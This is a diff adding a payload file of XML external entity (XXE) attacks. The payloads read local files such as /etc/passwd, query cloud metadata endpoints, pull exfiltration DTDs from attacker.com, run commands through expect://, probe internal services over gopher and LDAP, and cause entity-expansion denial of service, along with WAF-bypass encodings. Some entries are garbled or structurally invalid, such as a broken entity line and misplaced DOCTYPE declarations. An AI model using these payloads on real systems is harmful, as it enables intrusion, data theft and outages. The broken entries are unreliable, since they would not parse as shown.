@@ -1,0 +1,348 @@
+# XXE/XML Injection Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: XML External Entity
+
+# ============================================
+# BASIC XXE
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# BASIC XXE WITH CDATA
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo><![CDATA[&xxe;]]></foo>
+
+# ============================================
+# XXE WITH DTD
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<foo>&xxe;</foo>
+
+# External DTD content:
+# <!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+# ============================================
+# XXE WITH PARAMETER ENTITY
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+%xxe;
+]>
+<foo>test</foo>
+
+# ============================================
+# FILE DISCLOSURE
+# ============================================
+
+# /etc/passwd
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+# Windows
+<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+
+# Read PHP source
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+
+# ============================================
+# SSRF VIA XXE
+# ============================================
+
+<!ENTITY xxe SYSTEM "http://internal-server/secret">
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+
+# ============================================
+# BLIND XXE
+# ============================================
+
+# Blind XXE with out-of-band
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
+%xxe;
+]>
+<foo>test</foo>
+
+# External DTD:
+# <!ENTITY % file SYSTEM "file:///etc/passwd">
+# <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
+# %dtd;
+
+# ============================================
+# XXE + SSRF COMBINED
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# XXE + CRLF INJECTION
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://attacker.com/%0D%0AInjected">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# BOM BYPASS
+# ============================================
+
+\xEF\xBB\xBF<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# ENCODED XXE
+# ============================================
+
+# Base64 encoded
+PD94bWwgdmVyc2lvbj0iMS4wIj8+DQo8IURFQ1RMT1cgZm9vIFsKPCFFVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPl0+DQo8Zm9vPiZ4eGU7PC9mb28+
+
+# URL encoded
+%3C%3Fxml%20version%3D%221.0%22%3F%3E%0A%3C%21DOCTYPE%20foo%20%5B%0A%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%0A%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E
+
+# ============================================
+# XXE + XINCLUDE
+# ============================================
+
+<?xml version="1.0"?>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include href="file:///etc/passwd" parse="text"></xi:include>
+</foo>
+
+# ============================================
+# XXE + XPATH
+# ============================================
+
+<?xml version="1.0"?>
+<foo>
+<bar xmlns:xxe="http://attacker.com">&xxe;</bar>
+</foo>
+
+# ============================================
+# XXE + SITEMAP
+# ============================================
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+<foo>&xxe;</foo>
+
+# ============================================
+# XXE + SVG
+# ============================================
+
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="100">
+<image height="200" width="200" xlink:href="file:///etc/passwd"/>
+</svg>
+
+# ============================================
+# XXE + SOAP
+# ============================================
+
+<?xml version="1.0"?>
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+<soap:Body>
+<foo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xfoo>&xxe;</xfoo>
+</foo>
+</soap:Body>
+</soap:Envelope>
+
+# ============================================
+# XXE + REST
+# ============================================
+
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<item>
+<name>Test</name>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<description>&xxe;</description>
+</item>
+</root>
+
+# ============================================
+# XXE + DOCX
+# ============================================
+
+# Inside word/document.xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# XXE + PDF (using XML wrapper)
+# ============================================
+
+<?xml version="1.0" encoding="UTF-8"?>
+<xfa xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/"
+ xmlns:bindings="http://www.w3.org/ns/xbl"
+ xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+<exploit xmlns="http://www.w3.org/2001/XInclude">
+<xi:include href="file:///etc/passwd" parse="text"/>
+</exploit>
+</xfa>
+
+# ============================================
+# XXE + JSON CONVERSION
+# ============================================
+
+{"xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}
+
+# ============================================
+# PILLARING TECHNIQUE
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY a "aaaaaaaaaa">
+<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+<!;&e;&eENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;">
+<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
+<!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
+<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
+]>
+<foo>&i;</foo>
+
+# ============================================
+# DTD RETRIEVAL
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % dtd SYSTEM "file:///usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd">
+%dtd;
+]>
+<foo>test</foo>
+
+# ============================================
+# XXE + Gopher
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# XXE + LDAP
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "ldap://localhost:389/cn=admin">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# WAF BYPASS - ENCODING
+# ============================================
+
+# UTF-16
+<?xml version="1.0" encoding="UTF-16"?>
+
+# UTF-7
+<?xml version="1.0" encoding="UTF-7"?>
+
+# ============================================
+# WAF BYPASS - ALTERNATIVE ENTITY SYNTAX
+# ============================================
+
+# Hex
+&#x3C;?xml version="1.0"?&#x3E;
+
+# Decimal
+&#60;?xml version="1.0"?&#62;
+
+# ============================================
+# XXE + XXE CHAIN
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+<foo>&xxe;</foo>
+
+# External DTD:
+# <!ENTITY xxe "&file;">
+
+# ============================================
+#blind XXE with FTP
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % dtd SYSTEM "ftp://attacker.com/evil.dtd">
+%dtd;
+]>
+<foo>test</foo>
+
+# ============================================
+# XXE + EXPECT
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "expect://id">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# XXE + INCLUDE
+# ============================================
+
+<?xml version="1.0"?>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include href="file:///etc/passwd"></xi:include>
+</foo>
+
